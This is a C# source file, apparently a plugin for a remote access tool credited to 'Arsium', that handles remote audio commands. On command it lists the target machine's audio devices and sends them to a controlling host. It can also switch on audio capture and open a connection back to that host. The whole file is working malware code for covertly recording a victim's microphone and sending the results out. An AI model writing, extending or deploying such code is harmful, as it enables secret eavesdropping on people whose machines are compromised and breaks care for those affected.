using PacketLib;
using PacketLib.Packet;
using System.Threading;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public static class Launch
    {
        internal static ClientHandler clientHandler;
        internal static string key;
        internal static string baseIp;
        internal static string HWID;
        internal static bool audioCapture;

        internal static RemoteAudioCapturePacket remoteAudioCapturePacket;
        public static void Main(LoadingAPI loadingAPI)
        {
            audioCapture = false;
            Launch.key = loadingAPI.key;
            Launch.baseIp = loadingAPI.baseIp;
            Launch.HWID = loadingAPI.HWID;

            switch (loadingAPI.currentPacket.packetType) 
            {
                case PacketType.AUDIO_GET_DEVICES:
                    ClientHandler clientHandlerGetAudioDevices = new ClientHandler(loadingAPI.host, key);
                    clientHandlerGetAudioDevices.ConnectStart();
                    RemoteAudioPacket remoteAudioPacket = new RemoteAudioPacket(GetDevices.GetAudioDevices(), loadingAPI.baseIp, loadingAPI.HWID);
                    while (!clientHandlerGetAudioDevices.Connected)
                        Thread.Sleep(125);
                    clientHandlerGetAudioDevices.SendPacket(remoteAudioPacket);
                    break;

                case PacketType.AUDIO_RECORD_ON:
                    audioCapture = true;
                    remoteAudioCapturePacket = (RemoteAudioCapturePacket)loadingAPI.currentPacket;
                    clientHandler = new ClientHandler(loadingAPI.host, key);
                    clientHandler.ConnectStart();
                    break;

                default:
                    return;
            }
        }
    }
}
